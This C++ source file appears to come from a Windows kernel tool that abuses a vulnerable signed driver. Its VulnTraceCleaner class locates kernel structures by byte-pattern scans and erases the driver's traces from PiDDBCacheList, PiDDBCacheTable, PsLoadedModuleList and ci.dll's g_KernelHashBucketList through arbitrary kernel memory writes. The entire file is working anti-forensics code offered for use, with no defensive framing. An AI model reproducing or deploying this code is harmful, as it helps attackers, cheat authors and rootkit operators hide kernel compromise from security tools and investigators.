#include "vuln_trace_cleaner.hpp"

#include <kernel/k32_context.hpp>
#include <kernel/k32_parser.hpp>

#include <utils/cmn_utils.hpp>

#include <ntdll.hpp>
#include <spdlog/spdlog.h>

VulnTraceCleaner::VulnTraceCleaner(std::shared_ptr<K32Context> k32ctx, std::shared_ptr<K32Module> k32Module)
    : k32ctx(std::move(k32ctx))
    , k32Module(std::move(k32Module))
{
}

bool VulnTraceCleaner::Cleanup() const
{
    if (!CleanupPiDDBCacheList()) {
        spdlog::error("Failed to cleanup vulnerable driver from PiDDBCacheList");
        return false;
    }

    if (!CleanupPiDDBCacheTable()) {
        spdlog::error("Failed to cleanup vulnerable driver from PiDDBCacheTable");
        return false;
    }

    if (!CleanupPsLoadedModuleList()) {
        spdlog::error("Failed to cleanup vulnerable driver from PsLoadedModuleList");
        return false;
    }

    if (!CleanupKernelHashBucketList()) {
        spdlog::error("Failed to cleanup vulnerable driver from g_KernelHashBucketList");
        return false;
    }

    return true;
}

bool VulnTraceCleaner::CleanupPiDDBCacheList() const
{
    static const auto _PiDDBCacheList = k32Module->GetModuleParser().FindAbsoluteAddr(
        "\x48\x8D\x15\x00\x00\x00\x00\x48\x8B\x0D\x00\x00\x00\x00\x00\x00\x00\x74",
        "xxx????xxx???????x", 3, 7);

    if (!_PiDDBCacheList) {
        spdlog::error("_PiDDBCacheList not found");
        return false;
    }

    uintptr_t link = 0;
    if (!k32ctx->GetDriver().ReadMemory(_PiDDBCacheList, &link, sizeof(link))) {
        spdlog::error("Failed to read head of PiDDBCacheList");
        return false;
    }

    while (link != _PiDDBCacheList) {
        PiDDBCacheEntry entry { };
        if (!k32ctx->GetDriver().ReadMemory(link, &entry, sizeof(entry))) {
            spdlog::error("Failed to read entry at 0x{:X}", link);
            return false;
        }

        uintptr_t flink = reinterpret_cast<uintptr_t>(entry.List.Flink);

        if (entry.TimeDateStamp == k32ctx->GetDriver().GetTimeStamp()) {
            uintptr_t blink = reinterpret_cast<uintptr_t>(entry.List.Blink);

            if (!k32ctx->GetDriver().WriteMemory(blink, &flink, sizeof(flink))) {
                spdlog::error("Failed to rewrite node Flink");
                return false;
            }

            if (!k32ctx->GetDriver().WriteMemory(flink + sizeof(uintptr_t), &blink, sizeof(blink))) {
                spdlog::error("Failed to rewrite node Blink");
                return false;
            }
        }

        link = flink;
    }

    return true;
}

bool VulnTraceCleaner::CleanupPiDDBCacheTable() const
{
    static const auto _PiDDBCacheTable = k32Module->GetModuleParser().FindAbsoluteAddr(
        "\x48\x8D\x0D\x00\x00\x00\x00\x45\x33\xF6\x48\x89\x44\x24",
        "xxx????xxxxxxx", 3, 7);

    if (!_PiDDBCacheTable) {
        spdlog::error("_PiDDBCacheTable not found");
        return false;
    }

    const auto& driver = k32ctx->GetDriver();
    const auto& name = driver.GetName();

    PiDDBCacheEntry compared = { 0 };
    compared.TimeDateStamp = driver.GetTimeStamp();

    std::wstring driverNameW(name.begin(), name.end());
    compared.DriverName.Buffer = driverNameW.data();
    compared.DriverName.Length = (USHORT)(driverNameW.size() * sizeof(wchar_t));
    compared.DriverName.MaximumLength = compared.DriverName.Length;

    const auto entry = k32ctx->RtlLookupElementGenericTableAvl(
        (PRTL_AVL_TABLE)_PiDDBCacheTable, (PVOID)&compared);

    if (!entry) {
        spdlog::error("Entry not found in PiDDBCacheTable");
        return false;
    }

    if (!k32ctx->RtlDeleteElementGenericTableAvl((PRTL_AVL_TABLE)_PiDDBCacheTable, entry)) {
        return false;
    }

    return true;
}

bool VulnTraceCleaner::CleanupPsLoadedModuleList() const
{
    static const auto _PsLoadedModuleList = k32Module->GetModuleParser().FindAbsoluteAddr(
        "\x48\x8B\x1D\x00\x00\x00\x00\x45\x33\xFF\x41\x8B\xF0",
        "xxx????xxxxxx", 3, 7);

    if (!_PsLoadedModuleList) {
        spdlog::error("_PsLoadedModuleList not found");
        return false;
    }

    const auto& driver = k32ctx->GetDriver();
    std::wstring driverName(driver.GetName().begin(), driver.GetName().end());

    uintptr_t flink = 0;
    if (!driver.ReadMemory(_PsLoadedModuleList, &flink, sizeof(uintptr_t))) {
        return false;
    }

    while (flink != _PsLoadedModuleList) {
        UNICODE_STRING name = { 0 };
        driver.ReadMemory(flink + offsetof(LDR_DATA_TABLE_ENTRY, BaseDllName), &name, sizeof(name));

        if (name.Length > 0 && name.Buffer) {
            std::wstring moduleName(name.Length / 2, L'\0');
            driver.ReadMemory(reinterpret_cast<uintptr_t>(name.Buffer), moduleName.data(), name.Length);

            if (_wcsicmp(moduleName.c_str(), driverName.c_str()) == 0) {
                UNICODE_STRING zeroed = { 0 };
                return driver.WriteMemory(flink + offsetof(LDR_DATA_TABLE_ENTRY, BaseDllName), &zeroed, sizeof(zeroed));
            }
        }

        if (!driver.ReadMemory(flink, &flink, sizeof(uintptr_t))) {
            break;
        }
    }

    return false;
}

bool VulnTraceCleaner::CleanupKernelHashBucketList() const
{
    static K32Module ci(k32ctx->GetDriver(), "ci.dll");
    static const auto _g_KernelHashBucketList = ci.GetModuleParser().FindAbsoluteAddr(
        "\x48\x8B\x1D\x00\x00\x00\x00\xEB\x00\xF7\x43\x00\x00\x00\x00\x00\x75\x00\x48\x8B\x0D\x00\x00\x00\x00\x48\x8D\x53\x00\x45\x33\xC0",
        "xxx????x?xx?????x?xxx????xxx?xxx", 3, 7);

    if (!_g_KernelHashBucketList) {
        spdlog::error("_g_KernelHashBucketList not found");
        return false;
    }

    struct HashBucketEntry {
        HashBucketEntry* Next;
        UNICODE_STRING DriverName;
    };

    uintptr_t current = 0;
    if (!k32ctx->GetDriver().ReadMemory(_g_KernelHashBucketList, &current, sizeof(current))) {
        spdlog::error("Failed to read head of g_KernelHashBucketList");
        return false;
    }

    if (!current) {
        return true;
    }

    const auto& driverName = k32ctx->GetDriver().GetName();
    uintptr_t prev = _g_KernelHashBucketList;

    while (current) {
        HashBucketEntry entry { };
        if (!k32ctx->GetDriver().ReadMemory(current, &entry, sizeof(entry))) {
            spdlog::error("Failed to read entry at 0x{:X}", current);
            break;
        }

        uintptr_t next = reinterpret_cast<uintptr_t>(entry.Next);

        wchar_t nameBuf[512] { };
        USHORT nameLen = min(entry.DriverName.Length, USHORT(sizeof(nameBuf) - sizeof(wchar_t)));

        if (entry.DriverName.Buffer && nameLen > 0) {
            k32ctx->GetDriver().ReadMemory(reinterpret_cast<uintptr_t>(entry.DriverName.Buffer), nameBuf, nameLen);
            nameBuf[nameLen / sizeof(wchar_t)] = L'\0';
        }

        std::string nameStr(nameBuf, nameBuf + nameLen / sizeof(wchar_t));

        if (nameStr.ends_with(driverName)) {
            if (!k32ctx->GetDriver().WriteMemory(prev, &next, sizeof(next))) {
                spdlog::error("Failed to remove entry at 0x{:X}", current);
                return false;
            }

            current = next;
            continue;
        }

        prev = current;
        current = next;
    }

    return true;
}